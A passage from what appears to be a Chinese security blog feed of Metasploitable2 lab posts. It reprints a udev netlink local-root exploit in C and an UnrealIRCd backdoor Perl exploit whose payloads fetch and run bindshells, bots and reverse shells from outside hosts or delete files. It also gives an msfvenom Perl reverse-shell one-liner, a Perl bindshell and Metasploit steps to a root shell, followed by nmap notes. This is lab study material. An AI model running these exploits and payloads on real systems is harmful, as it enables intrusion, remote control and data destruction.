class="hljs-meta">#<span class="hljs-keyword">define</span> NETLINK_KOBJECT_UEVENT 15</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span><br><span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br><span class="hljs-type">int</span> sock;<br><span class="hljs-type">char</span> *mp, *err;<br><span class="hljs-type">char</span> message[<span class="hljs-number">4096</span>];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">st</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msghdr</span> <span class="hljs-title">msg</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> <span class="hljs-title">iovector</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_nl</span> <span class="hljs-title">address</span>;</span><br><br><span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br>err = <span class="hljs-string">&quot;Pass the udevd netlink PID as an argument&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error: %s\n&quot;</span>, err);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ((stat(<span class="hljs-string">&quot;/etc/udev/rules.d/95-udev-late.rules&quot;</span>, &amp;st) == <span class="hljs-number">-1</span>) &amp;&amp;<br>    (stat(<span class="hljs-string">&quot;/lib/udev/rules.d/95-udev-late.rules&quot;</span>, &amp;st) == <span class="hljs-number">-1</span>)) &#123;<br>err = <span class="hljs-string">&quot;Required 95-udev-late.rules not found&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error: %s\n&quot;</span>, err);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (stat(<span class="hljs-string">&quot;/tmp/run&quot;</span>, &amp;st) == <span class="hljs-number">-1</span>) &#123;<br>err = <span class="hljs-string">&quot;/tmp/run does not exist, please create it&quot;</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-] Error: %s\n&quot;</span>, err);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br>system(<span class="hljs-string">&quot;chmod +x /tmp/run&quot;</span>);<br><br><span class="hljs-built_in">memset</span>(&amp;address, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(address));<br>address.nl_family = AF_NETLINK;<br>address.nl_pid = atoi(argv[<span class="hljs-number">1</span>]);<br>address.nl_groups = <span class="hljs-number">0</span>;<br><br>msg.msg_name = (<span class="hljs-type">void</span>*)&amp;address;<br>msg.msg_namelen = <span class="hljs-keyword">sizeof</span>(address);<br>msg.msg_iov = &amp;iovector;<br>msg.msg_iovlen = <span class="hljs-number">1</span>;<br><br>sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);<br>bind(sock, (<span class="hljs-keyword">struct</span> sockaddr *) &amp;address, <span class="hljs-keyword">sizeof</span>(address));<br><br>mp = message;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;remove@/d&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;SUBSYSTEM=block&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;DEVPATH=/dev/foo&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;TIMEOUT=10&quot;</span>) + <span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;ACTION=remove&quot;</span>) +<span class="hljs-number">1</span>;<br>mp += <span class="hljs-built_in">sprintf</span>(mp, <span class="hljs-string">&quot;REMOVE_CMD=/tmp/run&quot;</span>) +<span class="hljs-number">1</span>;<br><br>iovector.iov_base = (<span class="hljs-type">void</span>*)message;<br>iovector.iov_len = (<span class="hljs-type">int</span>)(mp-message);<br><br>sendmsg(sock, &amp;msg, <span class="hljs-number">0</span>);<br><br>close(sock);<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>Netlink 是一种在内核与用户应用间进行双向数据传输的非常好的方式，用户态应用使用标准的 socket API 就可以使用 netlink 提供的强大功能。使用netlink 进行应用与内核通信的应用很多，包括：路由 daemon（NETLINK_ROUTE），1-wire 子系统（NETLINK_W1），用户态 socket 协议（NETLINK_USERSOCK），防火墙（NETLINK_FIREWALL），socket 监视（NETLINK_INET_DIAG），netfilter 日志（NETLINK_NFLOG），ipsec 安全策略（NETLINK_XFRM），SELinux 事件通知（NETLINK_SELINUX），iSCSI 子系统（NETLINK_ISCSI），进程审计（NETLINK_AUDIT），转发信息表查询 （NETLINK_FIB_LOOKUP），netlink connector(NETLINK_CONNECTOR),netfilter 子系统（NETLINK_NETFILTER），IPv6 防火墙（NETLINK_IP6_FW），DECnet 路由信息（NETLINK_DNRTMSG），内核事件向用户态通知（NETLINK_KOBJECT_UEVENT），通用 netlink（NETLINK_GENERIC）。</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Metasploitable2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Metasploitable2系列练习-漏洞利用之UnrealIRCd</title>
    <link href="/blog/2020/04/28/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BUnrealIRCd/"/>
    <url>/blog/2020/04/28/Metasploitable2%E7%B3%BB%E5%88%97%E7%BB%83%E4%B9%A0-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B9%8BUnrealIRCd/</url>
    
    <content type="html"><![CDATA[<p><strong>上一篇学习了一下漏洞利用过程中的一些信息收集的准备工作，扫描了一下Metasploitable2的主机，发现好多开放的端口，从今天开始一个一个学习一下试一下能不能利用这些端口来进行一些渗透工作，一直学习就好了。</strong></p><p><img src="/%5Cimages%5Cfj44.jpg"></p><span id="more"></span><h2 id="什么是UnrealIRCd"><a href="#什么是UnrealIRCd" class="headerlink" title="什么是UnrealIRCd"></a>什么是UnrealIRCd</h2><p>UnrealIRCd是一款基于 C++ 的开源 IRCD 服务端应用</p><p>IRC 一种基于网络的群体聊天方式。可以进行群体聊天也可以进行个人对个人的单独聊天。这种起源于上世纪的聊天技术在当时被很多网友追捧。可惜经过网络信息交流方式日新月异的变化，逐渐被各类聊天软件所淘汰。<br>IRC具有分布式的客户端&#x2F;服务器结构。用户通过IRC软件连接并登录到到一个IRC服务器，可以访问这个服务器以及它所连接的其他服务器上的频道。 选择相应的聊天频道，既可以开始广播式的群里聊天。也可对频道中单独的用户发起聊天。</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><p>扫描结果如下：</p><p><img src="/images/metasploitable2-0.png"></p><p>可以看到，有两个关于 Unreal IRCd 的开放端口，分别为 6667 和 6697 </p><h3 id="使用hexchat-IRC客户端连接IRC-Server"><a href="#使用hexchat-IRC客户端连接IRC-Server" class="headerlink" title="使用hexchat IRC客户端连接IRC Server"></a>使用hexchat IRC客户端连接IRC Server</h3><p>安装客户端：sudo apt install -y hexchat</p><p>太慢的话建议更换kali 源，编辑 &#x2F;etc&#x2F;apt&#x2F;sources.list，注释掉原本的国外源，改用清华或者阿里的源：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta">#阿里云</span><br>deb http:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br>deb-src http:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><br><span class="hljs-meta">#清华大学</span><br>deb http:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br>deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></code></pre></td></tr></table></figure><p>安装完成后开启hexchat，添加一个 Metasploitable 2这个服务器：</p><p><img src="/%5Cimages%5Cmetasploitable2-1.png"></p><p>关闭窗口之后点击连接按钮，我们就成功连接到了服务器：</p><p><img src="/%5Cimages%5Cmetasploitable2-2.png"></p><p>在这里我们可以看到version Unreal3.2.8.1，下面我们可以去searchsploit 和 exploit-db 里进行查询评估，看看这个版本的 Unreal IRC 是否存在可被利用的漏洞</p><h3 id="Unreal-IRCd-3-2-8-1-漏洞评估"><a href="#Unreal-IRCd-3-2-8-1-漏洞评估" class="headerlink" title="Unreal IRCd 3.2.8.1 漏洞评估"></a>Unreal IRCd 3.2.8.1 漏洞评估</h3><h4 id="Searchsploit"><a href="#Searchsploit" class="headerlink" title="Searchsploit"></a>Searchsploit</h4><p>kali里面使用如下命令：searchsploit unreal ircd 3.2.8.1</p><p><img src="/images/metasploitable2-3.png"></p><p>可以看出该版本有三个可利用漏洞：</p><ul><li>后门漏洞可在 Metasploit 上利用的 Ruby exploit</li><li>本地溢出可造成DOS拒绝服务的 exploit ，但它只适用于 windows ，因此不适用我们的目标 Metasploitable 2 </li><li>远程下载和执行 Perl 脚本木马</li></ul><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="手动分析利用"><a href="#手动分析利用" class="headerlink" title="手动分析利用"></a>手动分析利用</h3><p>查看payloads脚本内容：</p><p>cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;remote&#x2F;13853.pl</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl</span><br><span class="hljs-comment"># Unreal3.2.8.1 Remote Downloader/Execute Trojan</span><br><span class="hljs-comment"># DO NOT DISTRIBUTE -PRIVATE-</span><br><span class="hljs-comment"># -iHaq (2l8)</span><br><br><span class="hljs-keyword">use</span> Socket;<br><span class="hljs-keyword">use</span> IO::Socket;<br><br><span class="hljs-comment">## Payload options</span><br><span class="hljs-keyword">my</span> $payload1 = <span class="hljs-string">&#x27;AB; cd /tmp; wget http://packetstormsecurity.org/groups/synnergy/bindshell-unix -O bindshell; chmod +x bindshell; ./bindshell &amp;&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload2 = <span class="hljs-string">&#x27;AB; cd /tmp; wget http://efnetbs.webs.com/bot.txt -O bot; chmod +x bot; ./bot &amp;&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload3 = <span class="hljs-string">&#x27;AB; cd /tmp; wget http://efnetbs.webs.com/r.txt -O rshell; chmod +x rshell; ./rshell &amp;&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload4 = <span class="hljs-string">&#x27;AB; killall ircd&#x27;</span>;<br><span class="hljs-keyword">my</span> $payload5 = <span class="hljs-string">&#x27;AB; cd ~; /bin/rm -fr ~/*;/bin/rm -fr *&#x27;</span>;<br><span class="hljs-comment">##Payload 1：使用 wget 下载和绑定一个 shell，并保存文件为 bindshell，赋予其执行权限，并进行执行。</span><br><span class="hljs-comment">##Payload 2：下载一个名为 bot 的文件，我们只能猜测它的选项到底是什么。</span><br><span class="hljs-comment">##Payload 3：下载一个文件，并保存为 rshell 。设置正确的权限，并执行文件。我们只能猜测，下载的有效载荷是一个反向的 shell 。</span><br><span class="hljs-comment">##Payload 4：停止 Unreal IRCD 服务。</span><br><span class="hljs-comment">##Payload 5：从服务器上删除 Unreal IRCD 服务。</span><br><br><span class="hljs-comment">##继续进行下一个代码块的分析，它是进行参数的检索及验证的，并打印其使用的相关信息在控制台上。</span><br><br>$host = <span class="hljs-string">&quot;&quot;</span>;<br>$port = <span class="hljs-string">&quot;&quot;</span>;<br>$type = <span class="hljs-string">&quot;&quot;</span>;<br>$host = @ARGV[<span class="hljs-number">0</span>];<br>$port = @ARGV[<span class="hljs-number">1</span>];<br>$type = @ARGV[<span class="hljs-number">2</span>];<br><br><span class="hljs-keyword">if</span> ($host eq <span class="hljs-string">&quot;&quot;</span>) &#123; usage(); &#125;<br><span class="hljs-keyword">if</span> ($port eq <span class="hljs-string">&quot;&quot;</span>) &#123; usage(); &#125;<br><span class="hljs-keyword">if</span> ($type eq <span class="hljs-string">&quot;&quot;</span>) &#123; usage(); &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">usage</span> </span>&#123;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;\nUsage :\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;perl unrealpwn.pl &lt;host&gt; &lt;port&gt; &lt;type&gt;\n\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;Command list :\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[1] - Perl Bindshell\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[2] - Perl Reverse Shell\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[3] - Perl Bot\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;-----------------------------\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[4] - shutdown ircserver\n&quot;</span>;<br>  <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;[5] - delete ircserver\n&quot;</span>;<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">##头 3 行设置了三个初始化为空的变量，分别为 host, port 和 type  ，接着它们被分别赋予了变量值。下面开始判断这 3 个变量是否为空值，如果为空则执行 usage 函数。这将会退出脚本的执行，因为最后一行代码为 exit(1)，即程序发生错误则退出执行。在使用说明中，我们可以看到，有 5 种不同的类型的 payload 可以用来利用这个漏洞。并且分别做了相应的号码排序。当我们仔细查看以上脚本内容，我们可以发现，类型 2 的 payload 和类型 3 的 payload 进行了切换</span><br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">unreal_trojan</span> </span>&#123;<br>  <span class="hljs-keyword">my</span> $ircserv = $host;<br>  <span class="hljs-keyword">my</span> $ircport = $port;<br>  <span class="hljs-keyword">my</span> $sockd = IO::Socket::INET-&gt;new (<span class="hljs-string">PeerAddr =&gt;</span> $ircserv, <span class="hljs-string">PeerPort =&gt;</span> $ircport, <span class="hljs-string">Proto =&gt;</span> <span class="hljs-string">&quot;tcp&quot;</span>) || <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Failed to connect to $ircserv on $ircport ...\n\n&quot;</span>;<br>  <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[+] Payload sent ...\n&quot;</span>;<br>  <span class="hljs-keyword">if</span> ($type eq <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload1&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload2&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;3&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload3&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;4&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload4&quot;</span>;<br>  &#125; <span class="hljs-keyword">elsif</span> ($type eq <span class="hljs-string">&quot;5&quot;</span>) &#123;<br>    <span class="hljs-keyword">print</span> $sockd <span class="hljs-string">&quot;$payload5&quot;</span>;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">printf</span> <span class="hljs-string">&quot;\nInvalid Option ...\n\n&quot;</span>;<br>    usage();<br>  &#125;<br>  <span class="hljs-keyword">close</span>($sockd);<br>  <span class="hljs-keyword">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><span class="hljs-comment">##在这个代码块中对应的 payload 分别进行执行，类型 1 执行 payload 1, 类型 2 执行 payload 2 等</span><br>unreal_trojan();<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/perl </span><br><span class="hljs-comment"># *** Synnergy Networks </span><br><span class="hljs-comment"># * Description: </span><br><span class="hljs-comment"># # Remote unix shell backdoor. </span><br><span class="hljs-comment"># * Author: # # headflux (hf@synnergy.net) # Synnergy Networks (c) 1999, http://www.synnergy.net </span><br><span class="hljs-comment"># * Usage: </span><br><span class="hljs-comment"># remote.com$ ./nohup bindshell.pl &amp; </span><br><span class="hljs-comment"># remote.com$ exit </span><br><span class="hljs-comment"># Connection closed by foreign host </span><br><span class="hljs-comment"># localhost$ telnet remote.com 60000 </span><br><span class="hljs-comment"># Trying 192.168.1.1... </span><br><span class="hljs-comment"># Connected to remote.com. </span><br><span class="hljs-comment"># Escape character is &#x27;^]&#x27;. </span><br><span class="hljs-comment"># (user@remote.com:/home/user/) </span><br><span class="hljs-comment"># cat /etc/passwd; etc </span><br><span class="hljs-comment"># *** Synnergy Networks use Socket; </span><br>$port = <span class="hljs-number">60000</span>; $proto = <span class="hljs-keyword">getprotobyname</span>(<span class="hljs-string">&#x27;tcp&#x27;</span>); $cmd = <span class="hljs-string">&quot;lpd&quot;</span>; $system = <span class="hljs-string">&#x27;echo &quot;(`whoami`@`uname -n`:`pwd`)&quot;; /bin/sh&#x27;</span>; $0 = $cmd; <span class="hljs-keyword">socket</span>(SERVER, PF_INET, SOCK_STREAM, $proto) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;socket:$!&quot;</span>; <span class="hljs-keyword">setsockopt</span>(SERVER, SOL_SOCKET, SO_REUSEADDR, <span class="hljs-keyword">pack</span>(<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-number">1</span>)) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;setsockopt: $!&quot;</span>; <span class="hljs-keyword">bind</span>(SERVER, sockaddr_in($port, INADDR_ANY)) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;bind: $!&quot;</span>; <span class="hljs-keyword">listen</span>(SERVER, SOMAXCONN) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;listen: $!&quot;</span>; <span class="hljs-keyword">for</span>(; $paddr = <span class="hljs-keyword">accept</span>(CLIENT, SERVER); <span class="hljs-keyword">close</span> CLIENT) &#123; <span class="hljs-keyword">open</span>(STDIN, <span class="hljs-string">&quot;&gt;&amp;CLIENT&quot;</span>); <span class="hljs-keyword">open</span>(STDOUT, <span class="hljs-string">&quot;&gt;&amp;CLIENT&quot;</span>); <span class="hljs-keyword">open</span>(STDERR, <span class="hljs-string">&quot;&gt;&amp;CLIENT&quot;</span>); <span class="hljs-keyword">system</span>($system); <span class="hljs-keyword">close</span>(STDIN); <span class="hljs-keyword">close</span>(STDOUT); <span class="hljs-keyword">close</span>(STDERR); &#125; <br></code></pre></td></tr></table></figure><h4 id="修改-Unreal-IRCD-3-2-8-1-exploit"><a href="#修改-Unreal-IRCD-3-2-8-1-exploit" class="headerlink" title="修改 Unreal IRCD 3.2.8.1 exploit"></a>修改 Unreal IRCD 3.2.8.1 exploit</h4><p>因为我们不能控制它下载了一个什么payload，所以我们可以修改payload以取得有效控制：</p><ol><li>使用 msfvenom 生成一个 reverse shell payload。</li><li>修改 exploit 代码。</li><li>使用 Netcat 获取一个 reverse shell。</li></ol><p>当前的 Perl 脚本的一个主要缺点是，它依赖于成功的利用及执行 wget 命令才能成功下载。因此，如果 wget 命令不在目标主机上，则会利用失败。下面将使用 msfvenom 生成一个 Perl 脚本的 payload 摆脱这种依赖和不可控性。命令如下：</p><p>msfvenom -p cmd&#x2F;unix&#x2F;reverse_perl LHOST&#x3D;192.168.52.134 LPORT&#x3D;4444 -f raw</p><p><img src="/%5Cimages%5Cmetasploitable2-4.png"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">perl</span> -MIO -e <span class="hljs-string">&#x27;<span class="hljs-variable">$p</span>=fork;exit,if(<span class="hljs-variable">$p</span>);foreach my <span class="hljs-variable">$key</span>(keys %ENV)&#123;if(<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=~/(.*)/)&#123;<span class="hljs-variable">$ENV</span>&#123;<span class="hljs-variable">$key</span>&#125;=<span class="hljs-variable">$1</span>;&#125;&#125;<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,&quot;192.168.52.134:4444&quot;);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);while(&lt;&gt;)&#123;if(<span class="hljs-variable">$_</span>=~ /(.*)/)&#123;system <span class="hljs-variable">$1</span>;&#125;&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><p>替换掉原本的payload，注意单引号用反斜线转义。</p><p>然后使用Netcat开启一个侦听：nc -lvp 4444</p><p>然后执行exploit：perl 13853.pl [target IP] [port] 1</p><p>我们就获取一个反向shell，并且是root权限：</p><p><img src="/images/metasploitable2-5.png"></p><h3 id="Metasploit-Unreal-IRCD-3-2-8-1-漏洞自动利用"><a href="#Metasploit-Unreal-IRCD-3-2-8-1-漏洞自动利用" class="headerlink" title="Metasploit  Unreal IRCD 3.2.8.1 漏洞自动利用"></a>Metasploit  Unreal IRCD 3.2.8.1 漏洞自动利用</h3><p>启动 msfconsole ，并搜索 Unreal IRCD 相关利用模块：</p><p><img src="/images/metasploitable2-6.png"></p><p>使用选中模块：use exploit&#x2F;unix&#x2F;irc&#x2F;unreal_ircd_3281_backdoor</p><p>查看可用 payloads ： show payloads</p><p><img src="/images/metasploitable2-7.png"></p><p>选一个payload：set payload cmd&#x2F;unix&#x2F;reverse_perl</p><p>查看并配置相关选项：</p><p>show options<br>set rhost [target ip]<br>set lhost [attack ip]</p><p><img src="/images/metasploitable2-8.png"></p><p>最后执行exploit：run</p><p><img src="/images/smetasploitable2-9.png"></p><p>成功获取到了一个root权限的shell！</p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
      <tag>Metasploitable2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>渗透练习-信息收集</title>
    <link href="/blog/2020/04/24/%E6%B8%97%E9%80%8F%E7%BB%83%E4%B9%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/blog/2020/04/24/%E6%B8%97%E9%80%8F%E7%BB%83%E4%B9%A0-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p><strong>最近喜欢上了使用msf来发现并利用一些漏洞，作为深入了解该类漏洞及其防御方法的入门兴趣开始叭，首先从信息收集开始学习。</strong></p><p><img src="/images/fj43.jpg"></p><span id="more"></span><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Nmap  （网络映射器）是Gordon Lyon最初编写的一种安全扫描器，用于发现计算机网络上的主机和服务，从而创建网络的“映射”。为了实现其目标，Nmap将特定数据包发送到目标主机，然后分析响应.NMAP强大的网络工具，用于枚举和测试网络。</p><p>NMAP的功能包括：</p><ul><li><p>主机发现 - 识别网络上的主机。例如，列出响应TCP和&#x2F;或ICMP请求或打开特定端口的主机。</p></li><li><p>端口扫描 - 枚举目标主机上的开放端口。</p></li><li><p>版本检测 - 询问远程设备上的网络服务以确定应用程序名称和版本号。</p></li><li><p>OS检测 - 确定网络设备的操作系统和硬件特性。</p></li><li><p>可与脚本进行脚本交互 - 使用Nmap脚本引擎（NSE）和Lua编程语言。</p></li></ul><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ol><li>纯扫描：nmap &lt;目标IP地址&gt;</li><li>普通扫描增加输出冗长：nmap -vv  &lt;目标IP地址&gt;</li><li>自定义端口扫描：-p（范围）&lt;目标IP&gt;</li><li>指定端口扫描：nmap -p（port1，port2，port3等…）&lt;目标IP&gt;</li><li>执行ping：nmap -sP &lt;目标IP地址或者网段&gt;</li><li>跟踪路由用于检测您的计算机数据包从路由器到ISP的路由到互联网直至其特定目的地： nmap –traceroute &lt;ip地址&gt;</li><li>操作系统检测：nmap -O &lt;目标IP地址&gt;  </li><li>nmap万能开关：  nmap -A  &lt;目标IP地址&gt;</li><li>列出指定网络上的每台主机的，不会向目标主机发送任何报文。端口扫描、操作系统探测或者ping扫描，在该命令下不会被执行：nmap -sL &lt;网段&gt;，用-P0选项会使Nmap对每一个指定的目标IP地址进行所要求的扫描</li><li>-PS [portlist] (TCP SYN Ping)<br>该选项发送一个设置了SYN标志位的空TCP报文。 默认目的端口为80 (可以通过改变nmap.h) 文件中的DEFAULT-TCP-PROBE-PORT值进行配置，但不同的端口也可以作为选项指<br>定。甚至可以指定一个以逗号分隔的端口列表(如 -PS22，23，25，80，113，1050，35000)，在这种情况下，每个端口会被并发地扫描。</li><li>-PA [portlist] (TCP ACK Ping)<br>TCP ACK ping和刚才讨论的-PS参数类似。不过选择-PA向目标发送的是ACK标志位而不是SYN。如果客户端向目标主机知识发送一个标志位为ACK的数据包，那么服务器就有理由认为这个数据包出问题，并回复一个RST的报文。</li><li>-PU [portlist] (UDP ping)<br>发送一个空的的 UDP报文到给定的端口(默认是31338)。如果目标主机的端口是关闭的话，UDP探测马上得到一个ICMP端口无法达到的回应报文。<br>这时，说明目标主机开启。而出现例如：TTL超时则表示该主机未开启。同时，这种方式可以绕过过滤以TCP方式探测的包。</li><li>-PR(ARP Ping)<br>基于 RFC1918私有地址范围的网络，在一个给定的时间绝大部分 IP地址都是不使用的。当Nmap试图发送一个原始IP报文如ICMP回声请求时， 操作系统必须确定对应于目标IP的硬件 地址(ARP)，这样它才能把以太帧送往正确的地址。</li><li>nmap -sS<br>SYN 扫描，半连接，受到syn&#x2F;ack响应后意味着端口开放，收到rst包意味着端口关闭。</li><li>sV:版本检测(sV) 版本检测是用来扫描目标主机和端口上运行的软件的版本</li><li>sudo nmap -p- -v -sS -sV -n 目标地址 –open -oX test.xml   扫描并导出</li></ol><h2 id="各种查询"><a href="#各种查询" class="headerlink" title="各种查询"></a>各种查询</h2><p><strong>Whois查询：</strong>使用vpn可以访问：<a href="https://www.yougetsignal.com/">https://www.yougetsignal.com/</a></p><p>除了这个还有其他的国内的，比如站长之家，爱站这两个。</p><p><strong>查询IP地址：</strong>国内的很多，常用ip138和ipip 这两个站，国外的话，用的ipinfo.io比较多</p><p><strong>查询备案信息：</strong>　　</p><p><a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a><br><a 